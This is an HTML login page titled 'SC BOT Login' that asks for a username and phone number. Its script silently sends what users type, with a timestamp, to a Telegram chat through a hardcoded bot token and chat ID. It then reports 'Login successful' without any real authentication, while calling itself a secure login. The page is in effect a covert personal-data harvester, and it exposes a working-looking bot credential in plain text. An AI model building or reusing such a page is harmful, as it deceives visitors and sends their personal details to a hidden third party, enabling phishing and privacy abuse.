<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SC BOT Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #4361ee;
      --primary-dark: #3a56d4;
      --secondary: #3f37c9;
      --dark: #1a1a2e;
      --light: #f8f9fa;
      --success: #4cc9f0;
      --danger: #f72585;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--dark), #16213e);
      color: var(--light);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .login-container {
      width: 100%;
      max-width: 380px;
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      border-radius: 15px;
      padding: 2rem;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
      text-align: center;
      animation: fadeIn 0.5s ease;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .logo {
      font-size: 2.8rem;
      color: var(--primary);
      margin-bottom: 1rem;
      text-shadow: 0 0 15px rgba(67, 97, 238, 0.5);
    }
    
    h2 {
      margin-bottom: 1.5rem;
      font-weight: 600;
      background: linear-gradient(to right, var(--success), var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .input-group {
      margin-bottom: 1.5rem;
      text-align: left;
      position: relative;
    }
    
    .input-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-size: 0.9rem;
      color: rgba(255, 255, 255, 0.8);
    }
    
    .input-icon {
      position: absolute;
      left: 15px;
      top: 38px;
      color: rgba(255, 255, 255, 0.6);
    }
    
    input {
      width: 100%;
      padding: 12px 12px 12px 40px;
      background: rgba(255, 255, 255, 0.1);
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 1rem;
      transition: all 0.3s;
    }
    
    input:focus {
      outline: none;
      background: rgba(255, 255, 255, 0.2);
      box-shadow: 0 0 0 2px rgba(67, 97, 238, 0.3);
    }
    
    button {
      width: 100%;
      padding: 14px;
      margin-top: 1rem;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
    }
    
    #status {
      margin-top: 1.5rem;
      min-height: 20px;
      font-size: 0.9rem;
    }
    
    .success {
      color: var(--success);
    }
    
    .error {
      color: var(--danger);
    }
    
    .copyright {
      margin-top: 2rem;
      font-size: 0.75rem;
      color: rgba(255, 255, 255, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    
    .loading {
      display: none;
      width: 18px;
      height: 18px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <i class="fas fa-robot"></i>
    </div>
    <h2>SC BOT Login</h2>
    
    <div class="input-group">
      <label for="name">Username</label>
      <i class="fas fa-user input-icon"></i>
      <input type="text" id="name" placeholder="Enter your name" autocomplete="username">
    </div>
    
    <div class="input-group">
      <label for="phone">Phone Number</label>
      <i class="fas fa-phone input-icon"></i>
      <input type="text" id="phone" placeholder="Enter phone number" autocomplete="tel">
    </div>
    
    <button onclick="login()">
      <span id="buttonText">Login</span>
      <div class="loading" id="loadingSpinner"></div>
    </button>
    
    <div id="status">Enter your details to login</div>
    
    <div class="copyright">
      <i class="far fa-copyright"></i>
      <span>2025 SC BOT System | Secure Login v2.0</span>
    </div>
  </div>

  <script>
    // Telegram Notification with Error Handling
    async function sendTelegramAlert(name, phone) {
      try {
        const botToken = "8124053888:AAE2Jp6IxqpNMALcGNCnSfaW9YHA8aUx63U";
        const chatId = "7557794128";
        const message = `ðŸ”” *NEW LOGIN* ðŸ””%0A%0A`
          + `*Name*: ${encodeURIComponent(name)}%0A`
          + `*Phone*: ${encodeURIComponent(phone)}%0A`
          + `*Time*: ${encodeURIComponent(new Date().toLocaleString())}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
        
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return true;
      } catch (error) {
        console.error("Telegram error:", error);
        return false;
      }
    }

    async function login() {
      const name = document.getElementById("name").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const status = document.getElementById("status");
      const button = document.querySelector("button");
      const buttonText = document.getElementById("buttonText");
      const spinner = document.getElementById("loadingSpinner");
      
      // Clear previous status
      status.className = "";
      
      // Validate inputs
      if (!name || !phone) {
        status.textContent = "Please fill in all fields";
        status.className = "error";
        return;
      }

      // Update UI
      button.disabled = true;
      buttonText.textContent = "Processing...";
      spinner.style.display = "block";
      status.textContent = "Authenticating...";
      
      try {
        // 1. Send Telegram notification
        const telegramSuccess = await sendTelegramAlert(name, phone);
        
        if (!telegramSuccess) {
          status.textContent = "Login successful (notification failed)";
          status.className = "success";
        } else {
          status.textContent = "Login successful! Redirecting...";
          status.className = "success";
        }
        
        // 2. Store user data
        localStorage.setItem("userName", name);
        localStorage.setItem("userPhone", phone);
        
        // 3. Redirect after delay
        setTimeout(() => {
          window.location.href = "index.html";
        }, 1500);
        
      } catch (error) {
        status.textContent = "Login error. Please try again.";
        status.className = "error";
        console.error("Login error:", error);
      } finally {
        button.disabled = false;
        buttonText.textContent = "Login";
        spinner.style.display = "none";
      }
    }
    
    // Allow Enter key to trigger login
    document.addEventListener("keypress", (e) => {
      if (e.key === "Enter") login();
    });
  </script>
</body>
</html>
